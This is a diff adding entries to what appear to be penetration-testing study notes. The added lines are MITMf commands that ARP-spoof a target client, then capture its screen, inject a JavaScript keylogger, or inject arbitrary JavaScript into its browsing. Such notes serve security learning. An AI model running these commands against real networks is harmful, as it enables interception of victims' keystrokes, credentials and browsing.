@@ -108,3 +108,11 @@ If the user clicks on the "remember me" button a cookie is made in the browser. 
   * Edit the `A` record, that is responsible for translate names to IP adresses
 * Become the MITM
   * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --dns`
+### Capture Screen & Injecting Keylogger
+* Capture Screen
+  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --screen`
+* Injecting Keylogger
+  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --jskeylogger`
+### Code Injection
+* Inject JS
+  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --inject --js-payload "alert('hello from hacker')"`
